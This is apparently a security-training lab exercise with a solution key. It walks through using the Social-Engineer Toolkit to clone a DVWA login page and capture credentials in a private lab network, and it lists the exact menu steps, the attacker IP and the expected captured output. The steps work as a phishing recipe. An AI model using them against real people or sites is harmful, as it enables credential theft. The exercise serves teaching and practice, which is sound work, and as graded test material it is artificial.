title: Credential Harvesting with SET
description: Clone a login page and simulate a phishing attack.
problemStatement:
# Objective
Use the Social-Engineer Toolkit (SET) to clone the DVWA login page and capture credentials.

## Environment
- Kali Linux (Attacker)
- Metasploitable or any local web server running DVWA.

## Steps
1.  Launch SET: `sudo setoolkit`.
2.  Navigate to **Social-Engineering Attacks** -> **Website Attack Vectors** -> **Credential Harvester Attack Method** -> **Site Cloner**.
3.  Set your **Kali IP** as the POST back address.
4.  Enter the URL to clone: `http://192.168.56.101/dvwa/login.php`.
5.  Open a browser on your host or a second VM and navigate to your Kali IP.
6.  Enter **any username and password** into the cloned DVWA page.
7.  Return to the SET terminal. You should see the captured credentials displayed.

## Deliverable
Screenshot of the SET terminal showing the captured username and password.

**Ethical Note**: This is a simulation. Never use this on a real target without explicit written permission.
hints: Ensure DVWA is accessible from Kali before cloning.
If port 80 is already in use, SET will ask if you want to use a different port (say yes).
expectedOutput: SET terminal shows `POSSIBLE USERNAME FIELD FOUND: username=admin` and `POSSIBLE PASSWORD FIELD FOUND: password=password`.
solutionCode:
# Run SET
sudo setoolkit

# Navigation:
1 (Social-Engineering Attacks)
2 (Website Attack Vectors)
3 (Credential Harvester Attack Method)
2 (Site Cloner)

# IP address for POST back:
192.168.56.102

# URL to clone:
http://192.168.56.101/dvwa/login.php

# Press Enter. Visit http://192.168.56.102 in a browser.
# Enter credentials. Check SET terminal.
